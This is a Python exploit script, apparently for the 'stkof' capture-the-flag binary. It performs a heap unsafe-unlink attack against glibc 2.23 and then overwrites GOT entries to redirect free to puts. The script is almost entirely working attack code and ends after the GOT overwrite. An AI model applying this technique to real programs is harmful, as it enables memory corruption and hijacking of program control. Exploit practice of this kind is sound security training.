# from LibcSearcher import *
from helper import *
import ctypes as c
from exp import ret2libc_A, ret2libc_B
loader = Loader("target/stkof", 64, debug=False)
loader.patch_AIO(2.23)
elf,libc = loader.init()
io = loader.process()
# io = loader.ida()
abbre(globals(), io, loader) # 此处定义了常用的缩写
menu(globals())


head = 0x602140

# trigger to madd buffer for io function
add(0x100)  # idx 1
# begin
add(0x30)  # idx 2
# small chunk size in order to trigger unlink
add(0x80)  # idx 3
# a fake chunk at global[2]=head+16 who's size is 0x20
payload = p64(0)  #prev_size
payload += p64(0x20)  #size
payload += p64(head + 16 - 0x18)  #fd
payload += p64(head + 16 - 0x10)  #bk
payload += p64(0x20)  # next chunk's prev_size bypass the check
payload = payload.ljust(0x30, b'a')

# overwrite global[3]'s chunk's prev_size
# make it believe that prev chunk is at global[2]
payload += p64(0x30)

# make it believe that prev chunk is free
payload += p64(0x90)
# pause()
edit(2, len(payload), payload)
# pause()
# unlink fake chunk, so global[2] =&(global[2])-0x18=head-8
free(3)
pause()
p.recvuntil(b'OK\n')

# overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got
payload = 'a' * 8 + p64(stkof.got['free']) + p64(stkof.got['puts']) + p64(
    stkof.got['atoi'])
edit(2, len(payload), payload)

# edit free@got to puts@plt
payload = p64(stkof.plt['puts'])
edit(0, len(payload), payload)